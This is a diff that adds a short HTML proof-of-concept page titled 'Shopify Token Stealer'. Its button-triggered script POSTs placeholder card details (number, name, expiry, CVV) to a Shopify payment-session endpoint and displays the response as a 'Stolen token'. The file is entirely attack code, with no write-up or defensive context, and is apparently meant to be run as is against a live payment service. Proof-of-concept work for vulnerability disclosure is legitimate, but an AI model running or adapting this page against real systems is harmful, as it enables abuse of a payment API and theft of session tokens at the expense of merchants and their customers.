@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Shopify Token Stealer PoC</title>
+</head>
+<body>
+  <h1>Shopify Token Stealer</h1>
+  <button onclick="stealToken()">Steal Token</button>
+  <pre id="output"></pre>
+
+  <script>
+    async function stealToken() {
+      const payload = {
+        number: "4111111111111111",
+        name: "Attacker",
+        expiry: "12/26",
+        cvv: "123"
+      };
+
+      try {
+        const res = await fetch("https://deposit.shopifycs.com/sessions", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const json = await res.json();
+        document.getElementById("output").textContent = "Stolen token: " + JSON.stringify(json);
+      } catch (err) {
+        document.getElementById("output").textContent = "Error: " + err.message;
+      }
+    }
+  </script>
+</body>
+</html>
